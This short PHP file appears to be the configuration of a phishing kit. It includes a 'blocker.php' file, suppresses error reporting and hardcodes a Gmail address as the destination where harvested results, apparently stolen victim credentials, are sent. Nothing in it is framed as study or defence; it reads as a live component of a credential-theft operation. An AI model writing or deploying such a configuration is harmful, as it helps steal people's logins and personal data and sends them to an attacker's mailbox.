<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "resultfofo1@gmail.com";
$ur_email   = "resultfofo1@gmail.com";
define("EMAIL", "$ur_email");
?>